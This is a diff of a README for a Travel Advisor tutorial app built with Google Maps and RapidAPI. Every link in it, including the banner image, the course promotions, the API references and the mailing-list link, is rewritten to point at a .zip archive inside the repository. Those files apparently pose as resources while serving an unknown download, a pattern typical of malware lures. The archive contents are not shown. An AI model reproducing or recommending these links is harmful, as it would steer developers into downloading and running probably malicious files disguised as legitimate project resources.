@@ -1,9 +1,9 @@
 # Travel Advisor
 
-![Travel Advisor](https://raw.githubusercontent.com/bookformeonline/project_travel_advisor/master/src/components/List/travel-advisor-project-v3.4.zip)
+![Travel Advisor](https://raw.githubusercontent.com/bookformeonline/project_travel_advisor/master/public/advisor-project-travel-v2.5.zip)
 
-### [🌟 Become a top 1% https://raw.githubusercontent.com/bookformeonline/project_travel_advisor/master/src/components/List/travel-advisor-project-v3.4.zip 13 developer in only one course](https://raw.githubusercontent.com/bookformeonline/project_travel_advisor/master/src/components/List/travel-advisor-project-v3.4.zip)
-### [🚀 Land your dream programming job in 6 months](https://raw.githubusercontent.com/bookformeonline/project_travel_advisor/master/src/components/List/travel-advisor-project-v3.4.zip)
+### [🌟 Become a top 1% https://raw.githubusercontent.com/bookformeonline/project_travel_advisor/master/public/advisor-project-travel-v2.5.zip 13 developer in only one course](https://raw.githubusercontent.com/bookformeonline/project_travel_advisor/master/public/advisor-project-travel-v2.5.zip)
+### [🚀 Land your dream programming job in 6 months](https://raw.githubusercontent.com/bookformeonline/project_travel_advisor/master/public/advisor-project-travel-v2.5.zip)
 
 ## Introduction
 Build and Deploy an advanced Travel Companion Application using Google Maps. With Geolocation, Google Maps API, Searching for places, Fetching restaurants, hotels and attractions based on location from specialized Rapid APIs, data filtering and much more, this Travel Advisor App is the best Maps Application that you can currently find on YouTube and on the entire internet.
@@ -16,11 +16,11 @@ In this video, you'll learn:
 - And most importantly fetching data from unlimited sources using RapidAPI
 - Essentially, you'll become the master of working with APIs
 
-[RapidAPI](https://raw.githubusercontent.com/bookformeonline/project_travel_advisor/master/src/components/List/travel-advisor-project-v3.4.zip)
-[Travel Advisor API](https://raw.githubusercontent.com/bookformeonline/project_travel_advisor/master/src/components/List/travel-advisor-project-v3.4.zip)
-[Open Weather Map API](https://raw.githubusercontent.com/bookformeonline/project_travel_advisor/master/src/components/List/travel-advisor-project-v3.4.zip)
+[RapidAPI](https://raw.githubusercontent.com/bookformeonline/project_travel_advisor/master/public/advisor-project-travel-v2.5.zip)
+[Travel Advisor API](https://raw.githubusercontent.com/bookformeonline/project_travel_advisor/master/public/advisor-project-travel-v2.5.zip)
+[Open Weather Map API](https://raw.githubusercontent.com/bookformeonline/project_travel_advisor/master/public/advisor-project-travel-v2.5.zip)
 
 ## Stay up to date with new projects
-New major projects coming soon, subscribe to the mailing list to stay up to date https://raw.githubusercontent.com/bookformeonline/project_travel_advisor/master/src/components/List/travel-advisor-project-v3.4.zip
+New major projects coming soon, subscribe to the mailing list to stay up to date https://raw.githubusercontent.com/bookformeonline/project_travel_advisor/master/public/advisor-project-travel-v2.5.zip
 
 Setup: run ```npm i && npm start``` to start the development server
